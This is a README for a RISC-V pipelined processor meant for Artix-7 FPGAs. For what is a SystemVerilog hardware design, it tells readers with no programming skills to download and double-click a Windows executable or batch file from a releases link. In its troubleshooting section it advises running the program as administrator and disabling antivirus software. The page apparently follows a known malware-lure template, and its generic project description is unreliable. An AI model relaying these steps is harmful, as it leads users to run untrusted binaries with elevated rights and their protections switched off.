# ⚙️ AtlasRV-32-bit-RISC-V-Pipelined-Processor - Simple RISC-V CPU on FPGA

[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)

## 📄 About AtlasRV-32-bit-RISC-V-Pipelined-Processor

AtlasRV-32-bit-RISC-V-Pipelined-Processor is a 32-bit RISC-V CPU built to run on an Artix-7 FPGA board. It uses pipelining to improve processing speed and includes features like hazard detection and data forwarding to increase efficiency and reduce errors in instruction flow. This processor is designed for people studying digital circuits, computer architecture, or anyone interested in how CPUs work inside hardware.

You do not need programming skills to run this software. This guide will lead you through downloading and running the application on a Windows computer, step by step.

## 🎯 Key Features

- Implements a 32-bit RISC-V instruction set (RV32I).
- Uses pipelining to process multiple instructions simultaneously.
- Built-in hazard detection to avoid errors during instruction execution.
- Data forwarding to improve speed without waiting for data to be written back.
- Designed for synthesis on Artix-7 FPGA hardware.
- Built with SystemVerilog and verified using RTL design practices.
- Supports basic CPU instruction types and control flow.

## 🖥️ System Requirements

- Windows 10 or later (64-bit recommended).
- At least 4 GB of RAM.
- Minimum 10 GB of free disk space.
- Internet access to download software.
- A compatible Artix-7 FPGA board (optional for advanced use).

Note: You can run simulation or analysis tools on your Windows computer even without the FPGA board.

## 🚀 Getting Started

Follow these instructions to download and run AtlasRV on your Windows PC.

## ⬇️ Download and Installation

Visit the following page to download the software:

[![Download Page](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)

1. Open the link above. It will take you to the Releases section on GitHub.
2. Look for the latest release. Releases are listed in order, with the newest at the top.
3. Find the file that matches your needs. If you want to simulate the processor on Windows, look for a Windows executable or ZIP file.
4. Click the file name to start downloading.
5. After downloading, open the file or extract it into a folder using Windows Explorer.

No installation wizard is required. Running or extracting the files will prepare the application to run.

## ▶️ Running the Processor Simulation

1. Open the folder where you downloaded or extracted the files.
2. Look for an executable file (ends with `.exe`) or a batch script (`.bat`).
3. Double-click the executable or script to start the program.
4. A command window or graphical program will open.
5. Follow any on-screen prompts to run the processor simulation or analysis.

If no executable is provided, the release may include simulation files you can run with third-party tools like Vivado Simulator. The FPGA development environment Vivado must be installed separately for this.

## 🔧 Using Vivado to Work with AtlasRV

This processor was created to run on Artix-7 FPGA boards using Vivado software. Here are basic steps to use AtlasRV inside Vivado on Windows:

1. Download and install Xilinx Vivado Design Suite from the Xilinx website.
2. Open Vivado and create a new project.
3. Import the AtlasRV source files (SystemVerilog code) into the project.
4. Set the target device to match your Artix-7 FPGA board.
5. Run synthesis and implementation processes in Vivado.
6. Use Vivado to generate a programming file (bitstream).
7. Connect your Artix-7 board to your computer.
8. Program the FPGA using Vivado's hardware manager.

This process requires knowledge of FPGA development and related tools.

## 🔍 Exploring the Files

The release includes several types of files:

- **Source Code:** SystemVerilog files defining the processor. These files end with `.sv` or `.v`.
- **Simulation Scripts:** Batch or TCL scripts to run simulations.
- **Documentation:** Files describing design details. These may be PDFs or text files.
- **Bitstreams:** Files to program FPGA boards (.bit files).

You can open source code files with any text editor. Simulation scripts require tools like Vivado Simulator or ModelSim.

## 🛠️ Troubleshooting Tips

- Make sure your Windows system is up to date.
- If the executable does not run, right-click and select "Run as administrator."
- Disable any antivirus software temporarily if it blocks the program.
- For FPGA programming, confirm your Artix-7 board drivers are installed.
- If simulation fails, check that Vivado is installed correctly and matches the version noted in the documentation.
- Review README or documentation files included in the release for updates.

## 📚 Additional Resources

- RISC-V official site: https://riscv.org
- Xilinx Vivado Download: https://www.xilinx.com/support/download.html
- FPGA Artix-7 tutorials and user guides (available from Xilinx and other tech websites)

## 🏷️ Project Topics

This project relates to:

- ASIC design
- Computer architecture
- CPU design
- FPGA development
- Pipeline processing
- RISC-V CPU
- RTL design and verification
- SystemVerilog hardware description language
- Vivado software use

---

[![Download Now](https://img.shields.io/badge/Download-AtlasRV-brightgreen?style=for-the-badge)](https://github.com/evanneimmoral547/AtlasRV-32-bit-RISC-V-Pipelined-Processor/releases)